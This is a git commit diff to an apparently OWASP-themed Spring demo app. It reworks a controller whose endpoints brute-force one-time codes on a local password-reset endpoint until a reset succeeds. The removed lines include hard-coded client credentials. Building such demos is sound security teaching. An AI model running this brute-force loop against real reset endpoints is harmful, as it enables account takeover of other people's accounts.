f4b6e346b143b61120b74dfdb92424c023c63237
sganapa2 <santoshganapa@gmail.com>
2024-02-19 21:31:40 +0530

    updated client/consumer api code

--- src/main/java/com/grid/owasp/owasp/CredentialStuffingController.java
+++ src/main/java/com/grid/owasp/owasp/CredentialStuffingController.java
@@ -2,15 +2,11 @@ package com.grid.owasp.owasp;
 
 
 import lombok.extern.slf4j.Slf4j;
-import org.springframework.http.HttpEntity;
-import org.springframework.http.HttpHeaders;
-import org.springframework.http.HttpStatus;
-import org.springframework.http.ResponseEntity;
+import org.springframework.http.*;
 import org.springframework.http.client.support.BasicAuthenticationInterceptor;
 import org.springframework.util.LinkedMultiValueMap;
 import org.springframework.util.MultiValueMap;
 import org.springframework.web.bind.annotation.PostMapping;
-import org.springframework.web.bind.annotation.RequestMapping;
 import org.springframework.web.bind.annotation.RequestParam;
 import org.springframework.web.bind.annotation.RestController;
 import org.springframework.web.client.RestTemplate;
@@ -22,52 +18,28 @@ import java.util.Objects;
 
 @Slf4j
 @RestController
-@RequestMapping("/credentialstuffing")
 public class CredentialStuffingController {
-
 
     String hostUrl = "http://localhost:8080/";
 
     @PostMapping("/v1/attack")
-    public ResponseEntity<String> bruteForceAttackV1(@RequestParam String userName, @RequestParam String newPassword) throws URISyntaxException {
+    public ResponseEntity<String> bruteForceAttackV1(@RequestParam String userName, @RequestParam String newPassword) {
 
         HttpHeaders headers = new HttpHeaders();
-        headers.set("Accept", "*/*");
-        headers.set("Accept-Encoding", "gzip, deflate, br");
-        headers.set("Connection", "keep-alive");
-        headers.set("userName", userName);
-        headers.set("newPassword", newPassword);
-        headers.setBearerAuth("pass");
-        headers.add("accept", "application/json");
-        headers.add("Authorization", "Basic dXNlcjpwYXNz");
-
+        headers.setContentType(MediaType.APPLICATION_FORM_URLENCODED);
 
         MultiValueMap<String, String> requestBody = new LinkedMultiValueMap<>();
-        requestBody.add("client_id", "aViwaUZXir44tcdmr6bg7m");
-        requestBody.add("client_secret", "65d952744a49774bcf24bcd32c521619");
-        requestBody.add("grant_type", "client_credentials");
-        requestBody.add("username", "user");
-        requestBody.add("password", "pass");
-
-
-        requestBody.add("Accept", "*/*");
-        requestBody.add("Accept-Encoding", "gzip, deflate, br");
-        requestBody.add("Connection", "keep-alive");
         requestBody.add("userName", userName);
         requestBody.add("newPassword", newPassword);
-        requestBody.add("accept", "application/json");
-        requestBody.add("Authorization", "Basic dXNlcjpwYXNz");
 
         for (int i = 0; i <= 999; i++) {
             try {
                 RestTemplate restTemplate = new RestTemplate();
                 restTemplate.getInterceptors().add(new BasicAuthenticationInterceptor("user", "pass"));
-                //String endpoint = hostUrl + "v1/reset-password?userName=";
                 String endpoint = hostUrl + "v1/reset-password?";
 
                 HttpEntity<?> request = new HttpEntity<>(requestBody, headers);
 
-                //String url = endpoint + userName + "&otpCode=" + i + "&newPassword=" + newPassword;
                 String url = endpoint + "otpCode=" + i;
 
                 ResponseEntity<String> result = restTemplate.postForEntity(url, request, String.class);
@@ -87,59 +59,39 @@ public class CredentialStuffingController {
     }
 
     @PostMapping("/v2/attack")
-    public ResponseEntity<String> bruteForceAttackV2(@RequestParam String username, @RequestParam String newPassword) throws URISyntaxException {
+    public ResponseEntity<String> bruteForceAttackV2(@RequestParam String userName, @RequestParam String newPassword) throws URISyntaxException {
 
         HttpHeaders headers = new HttpHeaders();
-        headers.set("Accept", "*/*");
-        headers.set("Accept-Encoding", "gzip, deflate, br");
-        headers.set("Connection", "keep-alive");
-        headers.set("userName", username);
-        headers.set("newPassword", newPassword);
-        headers.setBearerAuth("pass");
-        headers.add("accept", "application/json");
-        headers.add("Authorization", "Basic dXNlcjpwYXNz");
-
+        headers.setContentType(MediaType.APPLICATION_FORM_URLENCODED);
 
         MultiValueMap<String, String> requestBody = new LinkedMultiValueMap<>();
-        requestBody.add("client_id", "aViwaUZXir44tcdmr6bg7m");
-        requestBody.add("client_secret", "65d952744a49774bcf24bcd32c521619");
-        requestBody.add("grant_type", "client_credentials");
-        requestBody.add("username", "user");
-        requestBody.add("password", "pass");
-
-
-        requestBody.add("Accept", "*/*");
-        requestBody.add("Accept-Encoding", "gzip, deflate, br");
-        requestBody.add("Connection", "keep-alive");
-        requestBody.add("userName", username);
+        requestBody.add("userName", userName);
         requestBody.add("newPassword", newPassword);
-        requestBody.add("accept", "application/json");
-        requestBody.add("Authorization", "Basic dXNlcjpwYXNz");
 
         for (int i = 100; i <= 150; i++) {
             try {
                 RestTemplate restTemplate = new RestTemplate();
                 restTemplate.getInterceptors().add(new BasicAuthenticationInterceptor("user", "pass"));
-                String endpoint = hostUrl + "v2/reset-password?userName=";
+                String endpoint = hostUrl + "v2/reset-password?";
 
-                HttpEntity<?> request = new HttpEntity<>(requestBody, headers);
+                HttpEntity<?> request = new HttpEntity<>(headers);
 
-                String url = endpoint + username + "&otpCode=" + i + "&newPassword=" + newPassword;
+                String url = endpoint + "otpCode=" + i;
                 ResponseEntity<String> result = restTemplate.postForEntity(url, request, String.class);
 
                 log.info("OtpCode " + i + " is CORRECT!");
                 if (result.hasBody() && Objects.requireNonNull(result.getBody()).contains("success")) {
                     log.info("Result: " + result + " ATTACK is successful and password reset for user: " +
-                            username + " with new password: " + newPassword + " with otpCode: " + i);
+                            userName + " with new password: " + newPassword + " with otpCode: " + i);
                     return ResponseEntity.ok("ATTACK is successful and password reset for user: " +
-                            username + " with new password: " + newPassword);
+                            userName + " with new password: " + newPassword);
                 }
             } catch (Exception e) {
                 log.info("OtpCode " + i + " is incorrect");
             }
         }
         Map<String, String> errorDetails = new HashMap<>();
-        errorDetails.put("ErrorMessage", "ATTACK is not successful for user: " + username);
+        errorDetails.put("ErrorMessage", "ATTACK is not successful for user: " + userName);
         return new ResponseEntity(errorDetails, HttpStatus.TOO_MANY_REQUESTS);
     }
 
